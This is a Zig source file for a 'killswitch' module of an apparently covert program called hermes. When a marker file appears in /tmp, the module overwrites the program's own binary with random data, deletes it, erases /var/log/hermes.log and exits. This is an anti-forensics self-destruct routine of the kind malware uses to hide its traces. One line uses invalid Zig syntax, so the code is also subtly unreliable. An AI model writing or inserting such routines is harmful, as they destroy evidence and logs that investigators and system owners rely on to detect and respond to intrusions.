//! Killswitch: checks for marker file, overwrites self, deletes logs, exits.
const std = @import("std");
const logger = @import("logger.zig");
const crypto = @import("../network/crypto.zig");

const KILLSWITCH_PATH = "/tmp/stop_hermes";

pub fn check() void {
    if (std.fs.cwd().access(KILLSWITCH_PATH, .{})) |_| {
        logger.warn("Killswitch file detected, self-destructing...", .{});
        // Overwrite self binary with random data
        const self_path = std.fs.selfExePathAlloc(std.heap.page_allocator) catch null;
        if (self_path) |p| {
            const file = std.fs.cwd().openFile(p, .{ .mode = .write_only }) catch null;
            if (file) |f| {
                const size = (f.stat() catch null)?.size orelse 0;
                if (size > 0) {
                    var buf: [4096]u8 = undefined;
                    std.crypto.random.bytes(&buf);
                    var written: u64 = 0;
                    while (written < size) {
                        const n = f.write(buf[0..@min(buf.len, size - written)]) catch break;
                        written += n;
                    }
                }
                f.close();
            }
            std.fs.cwd().deleteFile(p) catch {};
            std.heap.page_allocator.free(p);
        }
        // Delete log file
        std.fs.cwd().deleteFile("/var/log/hermes.log") catch {};
        // Exit
        std.process.exit(0);
    } else |_| {}
}
